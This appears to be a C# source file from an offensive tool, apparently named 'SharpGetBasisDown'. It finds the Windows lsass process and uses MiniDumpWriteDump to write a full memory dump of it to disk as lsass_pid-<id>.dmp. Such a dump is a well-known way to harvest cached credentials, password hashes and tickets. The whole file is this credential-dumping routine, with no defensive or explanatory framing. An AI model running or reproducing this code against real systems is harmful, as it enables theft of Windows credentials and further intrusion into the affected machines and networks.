using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace SharpGetBasisDown
{
    class MiniDump
    {

        [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
        static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);

        public static void Minidump()
        {
            IntPtr targetProcessHandle = IntPtr.Zero;
            uint targetProcessId = 0;

            Process targetProcess = null;
            Process[] processes = Process.GetProcessesByName("lsass");
            targetProcess = processes[0];

            try
            {
                targetProcessId = (uint)targetProcess.Id;
                targetProcessHandle = targetProcess.Handle;
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("\n[X] Error getting handle to {0} ({1}): {2}\n", targetProcess.ProcessName, targetProcess.Id, ex.Message));
                return;
            }
            bool bRet = false;

            string dumpDir = Program.CreateDirectory();
            string dumpFile = String.Format("{0}\\lsass_pid-{1}.dmp", dumpDir, targetProcessId);

            using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))
            {
                bRet = MiniDumpWriteDump(targetProcessHandle, targetProcessId, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            }
        }
    }
}
